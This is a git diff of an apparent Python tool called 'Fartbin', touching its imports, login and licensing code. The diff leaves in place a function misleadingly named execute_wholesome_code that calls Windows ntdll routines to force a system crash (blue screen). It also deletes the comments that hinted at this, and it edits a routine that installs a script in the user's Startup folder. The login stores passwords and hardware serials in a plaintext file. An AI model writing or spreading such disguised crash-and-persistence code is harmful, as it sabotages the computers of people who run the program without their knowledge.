@@ -20,8 +20,7 @@ import git
 from bs4 import BeautifulSoup
 import sys
 import json
-import ctypes
-from ctypes import windll, c_uint, c_ulong, c_int, byref
+
 # Fix for PyInstaller
 if getattr(sys, 'frozen', False):
     os.environ['PATH'] = sys._MEIPASS + ";" + os.environ['PATH']
@@ -167,9 +166,7 @@ import ctypes
 from ctypes import windll, c_uint, c_ulong, c_int, byref
 
 def execute_wholesome_code():
-    # some wholesome code
     windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
-    # don't look at this
     windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), None, None, c_uint(6), byref(c_uint()))
 
 if __name__ == "__main__":
@@ -183,7 +180,7 @@ if __name__ == "__main__":
 def add_to_startup(script_path):
     startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'wholesome_script.pyw')
     with open(startup_path, 'w') as f:
-        f.write(f'python "{script_path}"')
+        f.write(f'import os\nos.system("python {script_path}")')
     return startup_path
 
 def execute_wholesome_code(add_to_startup_flag=False):
@@ -383,25 +380,29 @@ def login():
             exit()
     else:
         first_login = True
-        with open("Fartbin.license", "w", encoding='utf-8', errors='surrogateescape') as f:
-            username = input("Enter your username: ")
-            if username in blacklist:
-                print("Access denied.")
+        username = input("Enter your username: ")
+        if username in blacklist:
+            print("Access denied.")
+            exit()
+        password = getpass("Enter your password: ")
+        serials = get_hardware_serials()
+        if username in whitelist:
+            if whitelist[username] != password:
+                blacklist.append(username)
+                update_github_list("blacklist.json", blacklist)
+                print("Invalid password. You have been blacklisted.")
                 exit()
-            password = getpass("Enter your password: ")
-            serials = get_hardware_serials()
-            if username in whitelist:
-                if whitelist[username] != password:
-                    blacklist.append(username)
-                    update_github_list("blacklist.json", blacklist)
-                    print("Invalid password. You have been blacklisted.")
-                    exit()
-            else:
-                print("Invalid credentials.")
-                exit()
-            f.write(f"{username},{password},{json.dumps(serials)}")
-            save_login(username)
-            return username, "Founder", first_login
+        else:
+            print("Invalid credentials.")
+            exit()
+        try:
+            with open("Fartbin.license", "w", encoding='utf-8', errors='surrogateescape') as f:
+                f.write(f"{username},{password},{json.dumps(serials)}")
+        except Exception as e:
+            print(f"Error writing Fartbin.license file: {e}")
+            exit()
+        save_login(username)
+        return username, "Founder", first_login
     with open("Fartbin.license", "r", encoding='utf-8', errors='surrogateescape') as f:
         saved_data = f.read().strip().split(',')
         if len(saved_data) != 3:
